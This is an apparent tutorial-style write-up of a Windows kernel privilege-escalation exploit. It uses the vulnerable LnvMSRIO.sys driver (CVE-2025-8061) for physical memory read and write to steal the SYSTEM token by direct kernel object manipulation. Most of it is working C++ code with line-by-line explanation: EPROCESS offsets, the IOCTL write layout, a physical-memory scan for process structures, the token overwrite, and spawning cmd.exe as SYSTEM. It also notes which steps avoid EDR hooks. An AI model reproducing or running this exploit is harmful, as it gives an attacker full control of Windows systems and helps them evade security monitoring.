# 02 — Token Stealing (DKOM)

**File:** `02_token_steal.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical memory read + write  
**Output:** Spawn `cmd.exe` with the token of NT AUTHORITY\SYSTEM

---

## Objective

Copy the token of the System process (PID=4) into the token of the current process → every child process created afterward will inherit the SYSTEM token → full privileges.

---

## Background Theory

### Tokens in Windows

Every process has a `_TOKEN` object in the kernel, pointed to by the `Token` field in `_EPROCESS`. A token contains the Security Identifier (SID), privileges, and group membership — this is what the kernel checks when a process attempts a privileged operation.

**`_EX_FAST_REF`**: The token is not stored directly as a plain pointer but uses `EX_FAST_REF` — a Windows kernel optimization:

```
bits [63:4] = actual pointer to the TOKEN object (16-byte aligned)
bits  [3:0] = reference count (managed by the kernel)
```

We copy **all 8 bytes** (including the ref count) of the System token over the self token. This works because the kernel dereferences bits [63:4] when it needs to check privileges, and the System TOKEN object is always valid.

### DKOM (Direct Kernel Object Manipulation)

Instead of calling the `NtSetInformationProcess` syscall (which is audited and EDR-hooked), we **directly write into the physical memory** of the EPROCESS. No kernel code is executed — this is a pure data-only attack.

### _EPROCESS offsets (x64, Win10 19041 → Win11 26100+)

| Field | Offset | Type |
|-------|--------|------|
| `DirectoryTableBase` (CR3) | `+0x028` | `UINT64` |
| `UniqueProcessId` | `+0x440` | `ULONG_PTR` |
| `ActiveProcessLinks` | `+0x448` | `LIST_ENTRY` |
| `Token` | `+0x4B8` | `EX_FAST_REF` (8 bytes) |
| `ImageFileName` | `+0x5A8` | `char[15]` |

---

## IOCTL Write Layout

```cpp
#pragma pack(push, 1)
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)
```

Driver expects:
- `PA`: physical address to write to
- `OT`: OperationType = 1 (write)
- `AS`: AccessSize = 8 (QWORD)
- `Data`: value to write (8 bytes)

Total input = 8 + 4 + 4 + 8 = 24 bytes.

---

## Line-by-Line Code Explanation

### FindEprocess()

```cpp
static uint64_t FindEprocess(DWORD targetPid, const char *targetName)
{
    uint64_t ram_top = PhysRamTop();

    // Largest offset we need to read = ImageFileName + 8 bytes buffer
    DWORD minTrail = g_off.ImageFileName + 8;  // = 0x5A8 + 8 = 0x5B0

    // Allocate a 1MB buffer to read each chunk
    auto *chunk = (uint8_t *)VirtualAlloc(nullptr, SCAN_CHUNK,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Scans in 1MB (1 << 20) chunks. Reason for not scanning 4KB at a time: IOCTL call overhead is very high per invocation; batching 1MB into a local buffer is significantly faster.

```cpp
    for (uint64_t pa = 0x100000ULL; pa < ram_top && !result; pa += SCAN_CHUNK) {
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue; // skip PCI MMIO

        // Read 4KB pages individually (driver limit: 4096 bytes per IOCTL)
        bool any_ok = false;
        for (DWORD pg = 0; pg < readLen; pg += 0x1000) {
            DWORD pl = (readLen - pg < 0x1000u) ? (readLen - pg) : 0x1000u;
            if (PhysRead(pa + pg, chunk + pg, pl)) any_ok = true;
            else memset(chunk + pg, 0, pl);  // unreadable page → zero it
        }
        if (!any_ok) continue;  // entire 1MB unreadable → skip
```

Why read 4KB at a time? Because `PhysRead()` has a guard `if (len > 4096) return false;` — the driver does not allow reading more than 4096 bytes at once. We must loop.

```cpp
        for (DWORD off = 0; off + minTrail <= readLen; off += SCAN_STEP) {
            // SCAN_STEP = 8: EPROCESS is 8-byte aligned

            // Check 1: UniqueProcessId == targetPid
            ULONG_PTR pid_val = *(ULONG_PTR *)(chunk + off + g_off.UniqueProcessId);
            if ((DWORD)pid_val != targetPid) continue;
            if (pid_val >> 32) continue;  // PID is 32-bit; high 32 bits must be 0
```

`(DWORD)pid_val != targetPid`: cast to 32-bit for PID comparison.  
`pid_val >> 32`: verify that the high 32 bits are zero — avoids false positives where a random UINT64 has matching low 32 bits.

```cpp
            // Check 2: ImageFileName starts with targetName
            const char *fname = (const char *)(chunk + off + g_off.ImageFileName);
            size_t nameLen = strlen(targetName);
            if (_strnicmp(fname, targetName, nameLen) != 0) continue;

            result = pa + off;  // physical address of the EPROCESS base
```

`_strnicmp`: case-insensitive comparison. Uses prefix match (not full match) because ImageFileName may truncate long names. Example: "02_token_ste" (15 chars max).

### Main Flow

```cpp
// Step 1: find the System EPROCESS
uint64_t system_eproc_pa = FindEprocess(4, "System");

// Read System's token
uint64_t system_token = 0;
PhysReadU64(system_eproc_pa + g_off.Token, &system_token);
// g_off.Token = 0x4B8
```

```cpp
// Step 2: find self EPROCESS
DWORD myPid = GetCurrentProcessId();
// Get exe name (stem only — no extension or path)
char myStem[16] = {};
strncpy_s(myStem, sizeof(myStem), myBaseName, 15);
if (char *dot = strrchr(myStem, '.')) *dot = '\0'; // strip ".exe"

uint64_t self_eproc_pa = FindEprocess(myPid, myStem);
```

ImageFileName in EPROCESS stores the filename **without path**, and may or may not include the extension depending on the build. We strip the extension for safer matching.

```cpp
// Step 3: save original token
uint64_t orig_token = 0;
PhysReadU64(self_eproc_pa + g_off.Token, &orig_token);

// Step 4: write System token into self
PhysWriteU64(self_eproc_pa + g_off.Token, system_token);

// Readback verify
uint64_t token_after = 0;
PhysReadU64(self_eproc_pa + g_off.Token, &token_after);
```

After writing, we read back to verify. A mismatch would indicate that the driver buffered the write without committing immediately (rare, but possible with write-combined memory).

```cpp
// Step 5: spawn SYSTEM cmd.exe
STARTUPINFOA si = {};
si.cb = sizeof(si);
PROCESS_INFORMATION pi = {};

BOOL ok = CreateProcessA(
    nullptr,
    (LPSTR)"cmd.exe",
    nullptr, nullptr, FALSE,
    CREATE_NEW_CONSOLE,   // create a new console window
    nullptr, nullptr,
    &si, &pi);
```

`CreateProcess` forks from the current process. The new process **inherits the parent's token** (which has been overwritten with SYSTEM). Result: cmd.exe runs with the SYSTEM token.

In the new cmd.exe window, typing `whoami` → prints `nt authority\system`.

---

## Why We Don't Restore the Token

```cpp
// Note: we do NOT restore the token here — restoring it would downgrade our
// privileges before the child process is fully initialised.
// The token will be cleaned up when this process exits.
```

Restoring before cmd.exe is fully initialized could downgrade the child process. When the parent process exits, the kernel cleans up the EPROCESS — no memory leak to worry about.

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | Does not check the Token field in EPROCESS |
| Race condition | Low — we write immediately after the scan; EPROCESS is unlikely to move |
| BSOD risk | Very low — the System TOKEN object remains valid for the entire session |
| EDR detection | Detectable via kernel callbacks if Ps* callbacks are still active |

---

## Flow Summary

```
FindEprocess(PID=4, "System") → system_eproc_pa
    ↓ read
System.Token (EX_FAST_REF) = 0xFFFF...xxxxx0F
    ↓
FindEprocess(myPid, myName) → self_eproc_pa
    ↓ write
self_eproc_pa + 0x4B8 = system_token
    ↓
CreateProcess("cmd.exe") → inherits SYSTEM token
    ↓
whoami → nt authority\system
```
